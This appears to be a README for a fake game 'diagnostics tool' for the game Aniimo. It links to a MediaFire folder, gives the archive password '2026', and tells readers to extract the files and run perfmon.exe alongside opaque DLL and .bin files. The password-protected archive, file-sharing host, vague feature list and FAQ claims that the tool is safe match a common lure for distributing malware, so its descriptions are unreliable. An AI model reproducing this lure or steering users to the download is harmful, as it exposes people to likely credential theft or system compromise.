<div align="center">

# 🎮 Aniimo

**Measure performance before changing settings.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Known issues](#-known-issues) · [System Requirements](#-system-requirements) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Aniimo is a free-to-play, open-world creature-catching RPG set in a colorful fantasy world. It combines exploration, collection, combat, online co-op, and competitive multiplayer. The PC version uses Unreal Engine 5 and can show variable performance across different systems.

Aniimo players who want structured Windows diagnostics for frame pacing, launch behavior, and session stability.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4126040/7b831079f0ff233d94b7b740fe06a74beb797262/ss_7b831079f0ff233d94b7b740fe06a74beb797262.1920x1080.jpg?t=1789813151" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4126040/bc7eb6c1f00cad1b659b7fbb9cdf67a64924d1e0/ss_bc7eb6c1f00cad1b659b7fbb9cdf67a64924d1e0.1920x1080.jpg?t=1789813151" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4126040/682ea2dfa7894198407ffcd8de8a6122dd6fe664/ss_682ea2dfa7894198407ffcd8de8a6122dd6fe664.1920x1080.jpg?t=1789813151" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known issues

- Frame rate can drop noticeably when capture notifications or other interface elements appear.
- Traversal and newly loaded areas may produce stutter or inconsistent frame pacing, particularly on older hardware.
- Some players report launch failures, freezes, or crashes after loading screens or early gameplay sections.
- Character rendering can occasionally show black or pixelated visual artifacts on affected systems.
- Online congestion and background system activity may contribute to perceived lag or uneven responsiveness.

## 🩺 How this tool helps

The tool records frame timing, process activity, startup parameters, and session events so players can compare symptoms with system behavior. Its recovery, scheduling, and graphics cache functions provide controlled troubleshooting steps without changing game content. Reports can help separate rendering delays, background workload, launch problems, and connection-related symptoms.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Records frame-rate behavior and supports consistent test conditions.
- ⚙️ **Startup Parameter Tool** — Stores and applies tested launch parameters for repeatable sessions.
- 🧠 **Process Scheduling Helper** — Inspects process scheduling and scheduling behavior during gameplay.
- 📊 **Stability Report + Session Recovery** — Collects session events and helps restore diagnostics after an interruption.
- 🧹 **Graphics Cache Utility** — Reviews and manages graphics-related cache folders with confirmation steps.
- 🎯 **Frame Timing Helper** — Tracks frame-time consistency to identify stutter and uneven pacing.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- perfmon.exe <- Main executable
|-- frame_module.dll <- Frame module
|-- config.cfg <- User configuration
|-- display_data.pak <- Display sync data
|-- core.bin <- Core runtime
|-- session_reader.dll <- Session reader
|-- Password 2026.txt <- Password reminder (empty)
|-- graphics_cache.pak <- Graphics cache data
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `perfmon.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.


---

<div align="center">
If this tool helped you, consider leaving a ⭐
</div>